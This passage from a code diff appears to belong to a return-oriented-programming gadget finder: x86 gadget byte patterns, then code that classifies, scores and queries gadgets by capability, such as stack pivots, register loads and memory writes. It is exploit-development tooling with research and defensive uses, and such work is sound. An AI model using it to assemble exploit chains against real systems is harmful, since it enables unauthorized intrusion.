+    { name: "call_ebx", bytes: [255, 211], mnemonic: "call ebx" },
+    { name: "call_ebp", bytes: [255, 213], mnemonic: "call ebp" },
+    { name: "call_esi", bytes: [255, 214], mnemonic: "call esi" },
+    { name: "call_edi", bytes: [255, 215], mnemonic: "call edi" },
+    // jmp register — remaining GP registers (eax/esp already in KNOWN_PATTERNS)
+    { name: "jmp_ecx", bytes: [255, 225], mnemonic: "jmp ecx" },
+    { name: "jmp_edx", bytes: [255, 226], mnemonic: "jmp edx" },
+    { name: "jmp_ebx", bytes: [255, 227], mnemonic: "jmp ebx" },
+    { name: "jmp_ebp", bytes: [255, 229], mnemonic: "jmp ebp" },
+    { name: "jmp_esi", bytes: [255, 230], mnemonic: "jmp esi" },
+    { name: "jmp_edi", bytes: [255, 231], mnemonic: "jmp edi" },
+    // call [register] — memory-indirect calls (DISPATCH_CALL_MEMORY)
+    { name: "call_mem_eax", bytes: [255, 16], mnemonic: "call [eax]" },
+    { name: "call_mem_ecx", bytes: [255, 17], mnemonic: "call [ecx]" },
+    { name: "call_mem_edx", bytes: [255, 18], mnemonic: "call [edx]" },
+    { name: "call_mem_ebx", bytes: [255, 19], mnemonic: "call [ebx]" },
+    { name: "call_mem_esi", bytes: [255, 22], mnemonic: "call [esi]" },
+    { name: "call_mem_edi", bytes: [255, 23], mnemonic: "call [edi]" },
+    // add esp, imm8 ; ret — small stack adjustments (0x04..0x7C, multiples of 4)
+    { name: "add_esp_4_ret", bytes: [131, 196, 4, 195], mnemonic: "add esp, 0x04 ; ret" },
+    { name: "add_esp_8_ret", bytes: [131, 196, 8, 195], mnemonic: "add esp, 0x08 ; ret" },
+    { name: "add_esp_c_ret", bytes: [131, 196, 12, 195], mnemonic: "add esp, 0x0C ; ret" },
+    { name: "add_esp_10_ret", bytes: [131, 196, 16, 195], mnemonic: "add esp, 0x10 ; ret" },
+    { name: "add_esp_14_ret", bytes: [131, 196, 20, 195], mnemonic: "add esp, 0x14 ; ret" },
+    { name: "add_esp_18_ret", bytes: [131, 196, 24, 195], mnemonic: "add esp, 0x18 ; ret" },
+    { name: "add_esp_1c_ret", bytes: [131, 196, 28, 195], mnemonic: "add esp, 0x1C ; ret" },
+    { name: "add_esp_20_ret", bytes: [131, 196, 32, 195], mnemonic: "add esp, 0x20 ; ret" },
+    { name: "add_esp_24_ret", bytes: [131, 196, 36, 195], mnemonic: "add esp, 0x24 ; ret" },
+    { name: "add_esp_28_ret", bytes: [131, 196, 40, 195], mnemonic: "add esp, 0x28 ; ret" },
+    { name: "add_esp_2c_ret", bytes: [131, 196, 44, 195], mnemonic: "add esp, 0x2C ; ret" },
+    { name: "add_esp_30_ret", bytes: [131, 196, 48, 195], mnemonic: "add esp, 0x30 ; ret" },
+    // xor reg, reg ; ret — zero register via self-XOR (opcode 31/33)
+    { name: "xor_eax_eax_ret", bytes: [49, 192, 195], mnemonic: "xor eax, eax ; ret" },
+    { name: "xor_ecx_ecx_ret", bytes: [49, 201, 195], mnemonic: "xor ecx, ecx ; ret" },
+    { name: "xor_edx_edx_ret", bytes: [49, 210, 195], mnemonic: "xor edx, edx ; ret" },
+    { name: "xor_ebx_ebx_ret", bytes: [49, 219, 195], mnemonic: "xor ebx, ebx ; ret" },
+    { name: "xor_esi_esi_ret", bytes: [51, 246, 195], mnemonic: "xor esi, esi ; ret" },
+    { name: "xor_edi_edi_ret", bytes: [51, 255, 195], mnemonic: "xor edi, edi ; ret" }
+  ];
+  var ALL_PATTERNS = [
+    ...KNOWN_PATTERNS,
+    ...buildPprPatterns(),
+    ...buildWritePatterns(),
+    ...buildReadPatterns(),
+    ...buildTransferPatterns(),
+    ...buildSwapPatterns(),
+    ...ADDITIONAL_PATTERNS
+  ];
+  function sameBytes(left, right) {
+    if (left.length !== right.length) {
+      return false;
+    }
+    for (let i = 0; i < left.length; i += 1) {
+      if (left[i] !== right[i]) {
+        return false;
+      }
+    }
+    return true;
+  }
+  function knownPatterns() {
+    return ALL_PATTERNS;
+  }
+  function knownPatternsForPointerSize(pointerSize) {
+    return pointerSize === 8 ? X64_PATTERNS : ALL_PATTERNS;
+  }
+  function validateInstructionCandidate(candidateBytes, executable, moduleBacked) {
+    const matched = ALL_PATTERNS.find((pattern) => sameBytes(candidateBytes, pattern.bytes));
+    return {
+      flags: {
+        executable,
+        moduleBacked,
+        decoded: matched !== void 0,
+        mnemonicMatch: matched !== void 0,
+        badcharSafe: true
+      },
+      mnemonic: matched == null ? void 0 : matched.mnemonic
+    };
+  }
+  function validateInstructionCandidateForPointerSize(candidateBytes, executable, moduleBacked, pointerSize) {
+    const patterns = knownPatternsForPointerSize(pointerSize);
+    const matched = patterns.find((pattern) => sameBytes(candidateBytes, pattern.bytes));
+    return {
+      flags: {
+        executable,
+        moduleBacked,
+        decoded: matched !== void 0,
+        mnemonicMatch: matched !== void 0,
+        badcharSafe: true
+      },
+      mnemonic: matched == null ? void 0 : matched.mnemonic
+    };
+  }
+
+  // src/rop/types.ts
+  var ROP_SCHEMA_VERSION = "v1";
+
+  // src/semantics/canonicalize.ts
+  function normalizeHexImmediate(value) {
+    const trimmed = value.trim().toLowerCase();
+    if (!trimmed) {
+      return trimmed;
+    }
+    if (/^0x[0-9a-f]+$/.test(trimmed)) {
+      return `0x${trimmed.slice(2).replace(/^0+/, "") || "0"}`;
+    }
+    if (/^-?\d+$/.test(trimmed)) {
+      const num = Number.parseInt(trimmed, 10);
+      if (Number.isFinite(num)) {
+        const normalized = (num >>> 0).toString(16);
+        return `0x${normalized}`;
+      }
+    }
+    return trimmed;
+  }
+  function normalizeOperand(text) {
+    let value = text.trim().toLowerCase();
+    value = value.replace(/\s+/g, " ");
+    value = value.replace(/\[\s+/g, "[");
+    value = value.replace(/\s+\]/g, "]");
+    value = value.replace(/\s*,\s*/g, ", ");
+    value = value.replace(/\s*\+\s*/g, "+");
+    value = value.replace(/\s*-\s*/g, "-");
+    return value;
+  }
+  function parseInstructionText(text) {
+    const cleaned = text.trim().replace(/;+\s*$/, "").trim();
+    if (!cleaned) {
+      return { mnemonic: "", operands: [] };
+    }
+    const firstSpace = cleaned.indexOf(" ");
+    const rawMnemonic = (firstSpace >= 0 ? cleaned.slice(0, firstSpace) : cleaned).trim().toLowerCase();
+    const remainder = firstSpace >= 0 ? cleaned.slice(firstSpace + 1).trim() : "";
+    if (!remainder) {
+      return { mnemonic: rawMnemonic, operands: [] };
+    }
+    const operands = remainder.split(",").map((operand) => normalizeOperand(operand)).filter((operand) => operand.length > 0).map((operand) => operand.replace(/\b(?:byte|word|dword|qword)\s+ptr\b/g, (match) => match.toLowerCase()));
+    return { mnemonic: rawMnemonic, operands };
+  }
+  function normalizeInstructionText(text) {
+    const { mnemonic, operands } = parseInstructionText(text);
+    if (!mnemonic) {
+      return "";
+    }
+    const normalizedMnemonic = mnemonic === "retn" ? "ret" : mnemonic;
+    const normalizedOperands = operands.map((operand) => {
+      if (normalizedMnemonic === "ret" && operand.length > 0) {
+        return normalizeHexImmediate(operand);
+      }
+      return normalizeHexImmediate(operand);
+    });
+    return normalizedOperands.length > 0 ? `${normalizedMnemonic} ${normalizedOperands.join(", ")}` : normalizedMnemonic;
+  }
+  function parseInstruction(text) {
+    const normalizedText = normalizeInstructionText(text);
+    const { mnemonic, operands } = parseInstructionText(text);
+    const normalizedMnemonic = mnemonic === "retn" ? "ret" : mnemonic;
+    return {
+      originalText: text.trim(),
+      normalizedText,
+      mnemonic: normalizedMnemonic,
+      operands: operands.map((operand) => normalizeHexImmediate(operand))
+    };
+  }
+  function canonicalizeInstruction(instruction) {
+    const operands = instruction.operands.map((operand) => normalizeHexImmediate(operand)).join(", ");
+    return operands.length > 0 ? `${instruction.mnemonic.toLowerCase()} ${operands}` : instruction.mnemonic.toLowerCase();
+  }
+  function canonicalizeInstructionSequence(sequence) {
+    return sequence.instructions.map((instruction) => canonicalizeInstruction(instruction)).join(" | ");
+  }
+  function canonicalizeTextSequence(text) {
+    return text.split(";").map((part) => part.trim()).filter((part) => part.length > 0).map((part) => normalizeInstructionText(part)).join(" | ");
+  }
+
+  // src/rop/classifier.ts
+  function hasExactFlow(semantic, kind) {
+    return semantic.summary.flowEffects.values.exact.has(kind);
+  }
+  var ARITHMETIC_MNEMONICS = /* @__PURE__ */ new Set(["add", "sub", "inc", "dec", "neg", "xor", "adc", "sbb", "or", "and", "not"]);
+  function zeroedRegisters(semantic) {
+    const zeroed = [];
+    for (const [register2, expr] of Object.entries(semantic.summary.registerTransforms)) {
+      if (expr.kind === "constant" && expr.value === 0) {
+        zeroed.push(register2);
+      }
+    }
+    return zeroed;
+  }
+  function pivotsStack(semantic) {
+    const esp = semantic.summary.registerTransforms.esp;
+    return esp.kind === "affine" && esp.base !== "esp" && esp.base !== "none";
+  }
+  function isLoadRegister(step) {
+    if (!step.supported) {
+      return void 0;
+    }
+    if (step.instruction.mnemonic === "pop" && step.instruction.operands.length === 1) {
+      const register2 = step.instruction.operands[0].trim().toLowerCase();
+      return register2 === "esp" ? void 0 : register2;
+    }
+    if (step.instruction.mnemonic === "mov" && step.instruction.operands.length === 2) {
+      const left = step.instruction.operands[0].trim().toLowerCase();
+      const right = step.instruction.operands[1].trim().toLowerCase();
+      if (/^[a-z]{3}$/.test(left) && /^[a-z]{3}$/.test(right) && left !== right && left !== "esp") {
+        return left;
+      }
+    }
+    return void 0;
+  }
+  function adjustsStackExplicitly(step) {
+    var _a;
+    const ins = step.instruction;
+    const destination = (_a = ins.operands[0]) == null ? void 0 : _a.trim().toLowerCase();
+    if ((ins.mnemonic === "add" || ins.mnemonic === "sub") && destination === "esp") {
+      return true;
+    }
+    return ins.mnemonic === "ret" && ins.operands.length >= 1;
+  }
+  function addCategory(categories, reasonList, category, rule, message, evidence) {
+    categories.add(category);
+    reasonList.push({ rule, message, evidence });
+  }
+  function buildEvidenceFromSemantic(semantic) {
+    return semantic.instructionSemantics.flatMap((step) => step.evidence.length > 0 ? step.evidence : [step.instruction.normalizedText]);
+  }
+  function classifySemanticSequence(semantic) {
+    const categories = /* @__PURE__ */ new Set();
+    const reasons = [];
+    const evidence = buildEvidenceFromSemantic(semantic);
+    if (hasExactFlow(semantic, "RETURN")) {
+      addCategory(categories, reasons, "RETURN", "return-flow", "gadget returns control to the stack", evidence);
+    }
+    if (hasExactFlow(semantic, "CALL") || hasExactFlow(semantic, "JUMP")) {
+      addCategory(categories, reasons, "FLOW_TRANSFER", "flow-transfer", "gadget transfers control flow", evidence);
+    }
+    for (const zeroReg of zeroedRegisters(semantic)) {
+      addCategory(categories, reasons, "ZERO_REGISTER", "zero-register", `net-zeroes ${zeroReg}`, evidence);
+    }
+    for (const step of semantic.instructionSemantics) {
+      const text = canonicalizeInstruction(step.instruction);
+      const loadRegister = isLoadRegister(step);
+      if (loadRegister) {
+        if (semantic.instructionSemantics.length === 1 || semantic.instructionSemantics.every((item) => item.supported)) {
+          addCategory(categories, reasons, "LOAD_REGISTER", "load-register", `loads ${loadRegister}`, [text]);
+        }
+      }
+      if (adjustsStackExplicitly(step)) {
+        addCategory(categories, reasons, "STACK_ADJUST", "stack-adjust", "adjusts the stack pointer by a fixed amount", [text]);
+      }
+      if (ARITHMETIC_MNEMONICS.has(step.instruction.mnemonic)) {
+        addCategory(categories, reasons, "ARITHMETIC", "arithmetic", "performs arithmetic transformation", [text]);
+      }
+      if (step.instruction.mnemonic === "pop" && step.instruction.operands.length > 1) {
+        addCategory(categories, reasons, "MULTI_REGISTER_LOAD", "multi-load", "loads multiple registers", [text]);
+      }
+      if (step.instruction.mnemonic === "call" || step.instruction.mnemonic === "jmp") {
+        addCategory(categories, reasons, "FLOW_TRANSFER", "explicit-flow", "explicit control-flow transfer", [text]);
+      }
+    }
+    if (pivotsStack(semantic)) {
+      addCategory(categories, reasons, "STACK_PIVOT", "stack-pivot", "esp becomes based on another register", evidence);
+    }
+    if (semantic.instructionSemantics.some((step) => step.instruction.mnemonic === "mov" && step.instruction.operands.length === 2 && step.instruction.operands[0].includes("[") && !step.instruction.operands[1].includes("["))) {
+      addCategory(categories, reasons, "MEMORY_WRITE", "memory-write", "contains a memory write", evidence);
+    }
+    if (semantic.instructionSemantics.some((step) => step.instruction.mnemonic === "mov" && step.instruction.operands.length === 2 && !step.instruction.operands[0].includes("[") && step.instruction.operands[1].includes("["))) {
+      addCategory(categories, reasons, "MEMORY_READ", "memory-read", "contains a memory read", evidence);
+    }
+    return { categories: [...categories], reasons };
+  }
+  function canonicalizeRopGadgetId(semantic) {
+    return canonicalizeInstructionSequence(semantic.instructionSequence);
+  }
+  function buildRopGadget(semantic) {
+    const classification = classifySemanticSequence(semantic);
+    return {
+      schemaVersion: ROP_SCHEMA_VERSION,
+      canonicalId: canonicalizeRopGadgetId(semantic),
+      categories: classification.categories,
+      classificationReasons: classification.reasons
+    };
+  }
+
+  // src/rop/scoring.ts
+  function addReason(reasons, rule, message, evidence, delta) {
+    reasons.push({ rule, message: `${message} (${delta >= 0 ? "+" : ""}${delta})`, evidence });
+  }
+  function hasCategory(categories, category) {
+    return categories.includes(category);
+  }
+  function scoreSemanticSequence(semantic, categories) {
+    let score = 100;
+    const reasons = [];
+    const evidence = semantic.instructionSemantics.flatMap((step) => step.evidence.length > 0 ? step.evidence : [step.instruction.normalizedText]);
+    const instructionCount = semantic.instructionSemantics.length;
+    const unsupportedCount = semantic.instructionSemantics.filter((step) => !step.supported).length;
+    const memoryWrites = semantic.summary.memoryWrites.values.exact.size + semantic.summary.memoryWrites.values.conservative.size;
+    const memoryReads = semantic.summary.memoryReads.values.exact.size + semantic.summary.memoryReads.values.conservative.size;
+    const flowTransfers = semantic.summary.flowEffects.values.exact.size;
+    const stackWrites = semantic.summary.writes.values.exact.has("esp") || semantic.summary.writes.values.conservative.has("esp");
+    const exactFields = [
+      semantic.summary.reads.confidence,
+      semantic.summary.writes.confidence,
+      semantic.summary.stackDelta.confidence,
+      semantic.summary.flags.confidence,
+      semantic.summary.memoryReads.confidence,
+      semantic.summary.memoryWrites.confidence,
+      semantic.summary.flowEffects.confidence
+    ].filter((confidence) => confidence === "EXACT").length;
+    score += exactFields * 5;
+    if (exactFields > 0) {
+      addReason(reasons, "exact-semantics", "exact semantic facts available", evidence, exactFields * 5);
+    }
+    if (instructionCount <= 2) {
+      score += 20;
+      addReason(reasons, "short-gadget", "short gadget", evidence, 20);
+    } else {
+      const penalty = (instructionCount - 2) * 10;
+      score -= penalty;
+      addReason(reasons, "long-gadget", "longer gadget", evidence, -penalty);
+    }
+    if (unsupportedCount > 0) {
+      const penalty = unsupportedCount * 30;
+      score -= penalty;
+      addReason(reasons, "unknown-semantics", "unsupported instructions reduce confidence", evidence, -penalty);
+    }
+    if (memoryWrites > 0) {
+      const penalty = memoryWrites * 35;
+      score -= penalty;
+      addReason(reasons, "memory-write", "memory writes are expensive and risky", evidence, -penalty);
+    }
+    if (memoryReads > 0) {
+      const penalty = memoryReads * 10;
+      score -= penalty;
+      addReason(reasons, "memory-read", "memory reads add side effects", evidence, -penalty);
+    }
+    if (flowTransfers > 0 || hasCategory(categories, "FLOW_TRANSFER")) {
+      const penalty = 55;
+      score -= penalty;
+      addReason(reasons, "flow-transfer", "explicit control-flow transfer", evidence, -penalty);
+    }
+    if (hasCategory(categories, "STACK_PIVOT")) {
+      const penalty = 25;
+      score -= penalty;
+      addReason(reasons, "stack-pivot", "stack pivot candidates are deprioritized by default", evidence, -penalty);
+    }
+    if (stackWrites && !hasCategory(categories, "STACK_PIVOT")) {
+      const penalty = 15;
+      score -= penalty;
+      addReason(reasons, "stack-write", "writes to ESP without a pivot classification", evidence, -penalty);
+    }
+    if (semantic.summary.writes.values.exact.size === 1 && semantic.summary.writes.values.exact.has("eax")) {
+      score += 5;
+      addReason(reasons, "simple-register-load", "simple single-register write", evidence, 5);
+    }
+    if (categories.includes("LOAD_REGISTER") || categories.includes("ZERO_REGISTER") || categories.includes("MOVE_REGISTER")) {
+      score += 10;
+      addReason(reasons, "register-primitive", "simple register primitive", evidence, 10);
+    }
+    if (semantic.summary.memoryWrites.values.unknown || semantic.summary.memoryReads.values.unknown) {
+      score -= 10;
+      addReason(reasons, "unknown-memory", "unknown memory effects reduce confidence", evidence, -10);
+    }
+    return {
+      score,
+      scoreReasons: reasons
+    };
+  }
+
+  // src/rop/query.ts
+  function normalizeRegisters(registers) {
+    return (registers != null ? registers : []).map((register2) => register2.trim().toLowerCase()).filter((register2) => register2.length > 0);
+  }
+  function normalizeKinds(values) {
+    if (values === void 0) {
+      return [];
+    }
+    return Array.isArray(values) ? values : [values];
+  }
+  function fieldSupportsAll(field, expected) {
+    if (expected.length === 0) {
+      return true;
+    }
+    if (!field || field.values.unknown) {
+      return false;
+    }
+    for (const value of expected) {
+      if (!field.values.exact.has(value) && !field.values.conservative.has(value)) {
+        return false;
+      }
+    }
+    return true;
+  }
+  function fieldExcludesAll(field, forbidden) {
+    if (forbidden.length === 0) {
+      return true;
+    }
+    if (!field || field.values.unknown) {
+      return false;
+    }
+    for (const value of forbidden) {
+      if (field.values.exact.has(value) || field.values.conservative.has(value)) {
+        return false;
+      }
+    }
+    return true;
+  }
+  function fieldMatchesAny(field, expected) {
+    if (expected.length === 0) {
+      return true;
+    }
+    if (!field || field.values.unknown) {
+      return false;
+    }
+    for (const value of expected) {
+      if (field.values.exact.has(value) || field.values.conservative.has(value)) {
+        return true;
+      }
+    }
+    return false;
+  }
+  function hasKnownValues(field) {
+    return !!field && !field.values.unknown && (field.values.exact.size > 0 || field.values.conservative.size > 0);
+  }
+  function isDefinitelyEmpty(field) {
+    return !!field && !field.values.unknown && field.values.exact.size === 0 && field.values.conservative.size === 0;
+  }
+  function matchesStackDelta(field, expected) {
+    return fieldMatchesAny(field, expected);
+  }
+  var CAPABILITY_ALIASES = {
+    ARITHMETIC: [
+      "REGISTER_ADD",
+      "REGISTER_SUB",
+      "REGISTER_XOR",
+      "REGISTER_ADC",
+      "REGISTER_SBB",
+      "REGISTER_OR",
+      "REGISTER_AND",
+      "REGISTER_NOT",
+      "REGISTER_NEGATE",
+      "REGISTER_INCREMENT",
+      "REGISTER_DECREMENT"
+    ]
+  };
+  function matchesCapability(gadget, expected) {
+    if (expected.length === 0) {
+      return true;
+    }
+    const expanded = /* @__PURE__ */ new Set();
+    for (const item of expected) {
+      const upper = item.trim().toUpperCase();
+      const aliases = CAPABILITY_ALIASES[upper];
+      if (aliases) {
+        for (const a of aliases)
+          expanded.add(a);
+      } else {
+        expanded.add(upper);
+      }
+    }
+    return gadget.capabilities.some((capability2) => expanded.has(capability2.kind));
+  }
+  function matchesTerminator(gadget, expected) {
+    if (expected.length === 0) {
+      return true;
+    }
+    return fieldMatchesAny(gadget.semanticSummary.summary.flowEffects, expected);
+  }
+  function matchesExecutableOnly(gadget) {
+    return gadget.locations.some((location) => location.executable !== "UNKNOWN");
+  }
+  function isIdentityTransform(register2, expr) {
+    return !!expr && expr.kind === "affine" && expr.base === register2 && expr.offset.kind === "constant" && expr.offset.value === 0;
+  }
+  function matchesPreserves(gadget, registers) {
+    if (registers.length === 0) {
+      return true;
+    }
+    const transforms = gadget.semanticSummary.summary.registerTransforms;
+    return registers.every((register2) => isIdentityTransform(register2, transforms[register2]));
+  }
+  function normalizeTransformQuery(query) {
+    var _a, _b;
+    return {
+      register: query.register.trim().toLowerCase(),
+      base: (_a = query.base) == null ? void 0 : _a.trim().toLowerCase(),
+      offset: query.offset,
+      offsetRegister: (_b = query.offsetRegister) == null ? void 0 : _b.trim().toLowerCase(),
+      constant: query.constant,
+      fromMemory: query.fromMemory
+    };
+  }
+  function matchesTransform(expr, query) {
+    if (!expr) {
+      return false;
+    }
+    if (query.constant !== void 0) {
+      if (expr.kind !== "constant" || expr.value !== query.constant) {
+        return false;
+      }
+    }
+    if (query.fromMemory !== void 0 && expr.kind === "memory" !== query.fromMemory) {
+      return false;
+    }
+    const wantsAffine = query.base !== void 0 || query.offset !== void 0 || query.offsetRegister !== void 0;
+    if (wantsAffine) {
+      if (expr.kind !== "affine") {
+        return false;
+      }
+      if (query.base !== void 0 && expr.base !== query.base) {
+        return false;
+      }
+      if (query.offset !== void 0 && (expr.offset.kind !== "constant" || expr.offset.value !== query.offset)) {
+        return false;
+      }
+      if (query.offsetRegister !== void 0 && (expr.offset.kind !== "register" || expr.offset.register !== query.offsetRegister)) {
+        return false;
+      }
+    }
+    return true;
+  }
+  function matchesTransforms(gadget, queries) {
+    if (queries.length === 0) {
+      return true;
+    }
+    const transforms = gadget.semanticSummary.summary.registerTransforms;
+    return queries.every((query) => matchesTransform(transforms[query.register], query));
+  }
+  function queryRopGadgets(gadgets, query) {
+    var _a, _b, _c;
+    const reads = normalizeRegisters(query.reads);
+    const writes2 = normalizeRegisters(query.writes);
+    const preserves = normalizeRegisters(query.preserves);
+    const preservesThroughout = normalizeRegisters(query.preservesThroughout);
+    const transforms = ((_a = query.transforms) != null ? _a : []).map(normalizeTransformQuery);
+    const stackDelta = normalizeKinds(query.stackDelta);
+    const capabilities = normalizeKinds(query.capability);
+    const terminators = normalizeKinds(query.terminator);
+    const memoryReads = (_b = query.memoryReads) != null ? _b : query.memoryRead;
+    const memoryWrites = (_c = query.memoryWrites) != null ? _c : query.memoryWrite;
+    return gadgets.filter((gadget) => {
+      if (query.executableOnly && !matchesExecutableOnly(gadget)) {
+        return false;
+      }
+      if (!fieldSupportsAll(gadget.semanticSummary.summary.reads, reads)) {
+        return false;
+      }
+      if (!fieldSupportsAll(gadget.semanticSummary.summary.writes, writes2)) {
+        return false;
+      }
+      if (!matchesPreserves(gadget, preserves)) {
+        return false;
+      }
+      if (!fieldExcludesAll(gadget.semanticSummary.summary.writes, preservesThroughout)) {
+        return false;
+      }
+      if (!matchesTransforms(gadget, transforms)) {
+        return false;
+      }
+      if (!matchesStackDelta(gadget.semanticSummary.summary.stackDelta, stackDelta)) {
+        return false;
+      }
+      if (!matchesCapability(gadget, capabilities)) {
+        return false;
+      }
+      if (!matchesTerminator(gadget, terminators)) {
+        return false;
+      }
+      if (memoryReads !== void 0) {
+        const field = gadget.semanticSummary.summary.memoryReads;
+        if (memoryReads ? !hasKnownValues(field) : !isDefinitelyEmpty(field)) {
+          return false;
+        }
+      }
+      if (memoryWrites !== void 0) {
+        const field = gadget.semanticSummary.summary.memoryWrites;
+        if (memoryWrites ? !hasKnownValues(field) : !isDefinitelyEmpty(field)) {
+          return false;
+        }
+      }
+      return true;
+    });
+  }
+  function summarizeCapabilities(index) {
+    var _a, _b, _c, _d, _e;
+    const counts = /* @__PURE__ */ new Map();
+    for (const gadget of index.gadgets) {
+      for (const capability2 of gadget.capabilities) {
+        const key2 = [capability2.kind, (_a = capability2.register) != null ? _a : "", (_b = capability2.targetRegister) != null ? _b : ""].join(":");
+        const existing = (_e = counts.get(key2)) != null ? _e : {
+          kind: capability2.kind,
+          register: (_c = capability2.register) != null ? _c : "",
+          targetRegister: (_d = capability2.targetRegister) != null ? _d : "",
+          count: 0
+        };
+        existing.count += 1;
+        counts.set(key2, existing);
+      }
+    }
+    return [...counts.values()].sort((left, right) => {
+      if (left.kind !== right.kind) {
+        return left.kind.localeCompare(right.kind);
+      }
+      if (left.register !== right.register) {
+        return left.register.localeCompare(right.register);
+      }
+      return left.targetRegister.localeCompare(right.targetRegister);
+    }).map((entry) => ({
+      Kind: entry.kind,
+      Register: entry.register || "",
+      Target: entry.targetRegister || "",
+      Count: entry.count.toString()
+    }));
+  }
+
+  // src/rop/capabilities.ts
+  function key(kind, register2, targetRegister) {
+    return [kind, register2 != null ? register2 : "", targetRegister != null ? targetRegister : ""].join(":");
+  }
+  function push(map, capability2, gadget) {
+    var _a;
+    const k = key(capability2.kind, capability2.register, capability2.targetRegister);
+    const existing = (_a = map.get(k)) != null ? _a : [];
+    existing.push(gadget);
+    map.set(k, existing);
+  }
+  function buildCapabilities(gadgets) {
+    const capabilityMap = /* @__PURE__ */ new Map();
+    for (const gadget of gadgets) {
+      for (const capability2 of gadget.capabilities) {
+        push(capabilityMap, capability2, gadget);
+        if (capability2.kind === "MOVE_REGISTER" && capability2.targetRegister) {
+          push(capabilityMap, __spreadProps(__spreadValues({}, capability2), { register: void 0 }), gadget);
+        }
+        if (capability2.kind === "EXCHANGE_REGISTER" && capability2.register) {
+          push(capabilityMap, __spreadProps(__spreadValues({}, capability2), { targetRegister: void 0 }), gadget);
+          if (capability2.targetRegister) {
+            push(capabilityMap, {
+              kind: capability2.kind,
+              register: capability2.targetRegister,
+              targetRegister: capability2.register,
+              evidence: capability2.evidence
+            }, gadget);
+          }
+        }
+      }
+    }
+    return {
+      gadgets,
+      capabilityMap,
+      loadRegister(register2) {
+        var _a;
+        return (_a = capabilityMap.get(key("LOAD_REGISTER", register2))) != null ? _a : [];
+      },
+      zeroRegister(register2) {
+        var _a;
+        return (_a = capabilityMap.get(key("ZERO_REGISTER", register2))) != null ? _a : [];
+      },
+      moveIntoRegister(register2) {
+        var _a;
+        return (_a = capabilityMap.get(key("MOVE_REGISTER", void 0, register2))) != null ? _a : [];
+      },
+      exchangeWithRegister(register2) {
+        var _a;
+        return (_a = capabilityMap.get(key("EXCHANGE_REGISTER", register2))) != null ? _a : [];
+      },
+      stackPivotCandidates() {
+        var _a;
+        return (_a = capabilityMap.get(key("STACK_PIVOT"))) != null ? _a : [];
+      },
+      memoryReadCandidates() {
+        var _a;
+        return (_a = capabilityMap.get(key("MEMORY_READ"))) != null ? _a : [];
+      },
+      memoryWriteCandidates() {
+        var _a;
+        return (_a = capabilityMap.get(key("MEMORY_WRITE"))) != null ? _a : [];
+      },
+      query(query) {
+        return queryRopGadgets(gadgets, query);
+      }
+    };
+  }
+  function deriveCapabilities(semantic, categories) {
+    const capabilities = [];
+    const add = (capability2) => {
+      const duplicate = capabilities.some((existing) => existing.kind === capability2.kind && existing.register === capability2.register && existing.targetRegister === capability2.targetRegister);
+      if (!duplicate) {
+        capabilities.push(capability2);
+      }
+    };
+    for (const step of semantic.instructionSemantics) {
+      const text = step.instruction.normalizedText;
+      const operands = step.instruction.operands.map((operand) => operand.trim().toLowerCase());
+      if (step.instruction.mnemonic === "pop" && step.instruction.operands.length === 1 && operands[0] !== "esp") {
+        add({ kind: "LOAD_REGISTER", register: operands[0], evidence: [text] });
+        add({ kind: "LOAD_CONSTANT", register: operands[0], evidence: [text] });
+        add({ kind: "STACK_READ", register: operands[0], evidence: [text] });
+      }
+      if (step.instruction.mnemonic === "push" && operands.length === 1) {
+        add({ kind: "STACK_WRITE", register: operands[0], evidence: [text] });
+      }
+      if (step.instruction.mnemonic === "pushad") {
+        add({ kind: "DISPATCH_PUSHAD", evidence: [text] });
+        add({ kind: "STACK_WRITE", evidence: [text] });
+      }
+      if (step.instruction.mnemonic === "ret") {
+        add({ kind: "DISPATCH_RET", evidence: [text] });
+      }
+      if (step.instruction.mnemonic === "xor" && operands.length === 2) {
+        add({ kind: "REGISTER_XOR", register: operands[0], targetRegister: operands[1], evidence: [text] });
+        if (operands[0] === operands[1]) {
+          add({ kind: "ZERO_REGISTER", register: operands[0], evidence: [text] });
+          add({ kind: "REGISTER_ZERO", register: operands[0], evidence: [text] });
+        }
+      }
+      if (step.instruction.mnemonic === "mov" && step.instruction.operands.length === 2) {
+        const [left, right] = operands;
+        if (/^[a-z]{3}$/.test(left) && /^[a-z]{3}$/.test(right) && left !== right) {
+          add({ kind: "MOVE_REGISTER", register: left, targetRegister: right, evidence: [text] });
+          add({ kind: "REGISTER_TRANSFER", register: left, targetRegister: right, evidence: [text] });
+          if (left === "esp" || right === "esp") {
+            add({ kind: "STACK_COPY", register: left, targetRegister: right, evidence: [text] });
+          }
+        }
+        if (left.includes("[") && !right.includes("[")) {
+          add({ kind: "MEMORY_WRITE", register: right, evidence: [text] });
+          add({ kind: "STORE_MEMORY", register: right, evidence: [text] });
+        }
+        if (!left.includes("[") && right.includes("[")) {
+          add({ kind: "MEMORY_READ", register: left, evidence: [text] });
+          add({ kind: "LOAD_MEMORY", register: left, evidence: [text] });
+        }
+      }
+      if (step.instruction.mnemonic === "lea" && step.instruction.operands.length === 2) {
+        const [destination, address] = operands;
+        add({ kind: "REGISTER_LEA", register: destination, targetRegister: address, evidence: [text] });
+      }
+      if (step.instruction.mnemonic === "xchg" && step.instruction.operands.length === 2) {
+        const [left, right] = operands;
+        if (left.includes("[") || right.includes("[")) {
+          const memory = left.includes("[") ? left : right;
+          const register2 = left.includes("[") ? right : left;
+          add({ kind: "MEMORY_READ", register: register2, evidence: [text] });
+          add({ kind: "LOAD_MEMORY", register: register2, evidence: [text] });
+          add({ kind: "MEMORY_WRITE", register: register2, evidence: [text] });
+          add({ kind: "STORE_MEMORY", register: register2, evidence: [text] });
+          continue;
+        }
+        if (left === "esp" || right === "esp") {
+          add({ kind: "STACK_PIVOT", evidence: [text] });
+        }
+        add({ kind: "EXCHANGE_REGISTER", register: left, targetRegister: right, evidence: [text] });
+        add({ kind: "REGISTER_SWAP", register: left, targetRegister: right, evidence: [text] });
+      }
+      const unaryKind = {
+        neg: "REGISTER_NEGATE",
+        inc: "REGISTER_INCREMENT",
+        dec: "REGISTER_DECREMENT",
+        not: "REGISTER_NOT"
+      };
+      const unary = unaryKind[step.instruction.mnemonic];
+      if (unary && operands.length === 1) {
+        add({ kind: unary, register: operands[0], evidence: [text] });
+      }
+      const binaryKind = {
+        add: "REGISTER_ADD",
+        sub: "REGISTER_SUB",
+        adc: "REGISTER_ADC",
+        sbb: "REGISTER_SBB",
+        or: "REGISTER_OR",
+        and: "REGISTER_AND"
+      };
+      const binary = binaryKind[step.instruction.mnemonic];
+      if (binary && operands.length === 2) {
+        add({ kind: binary, register: operands[0], targetRegister: operands[1], evidence: [text] });
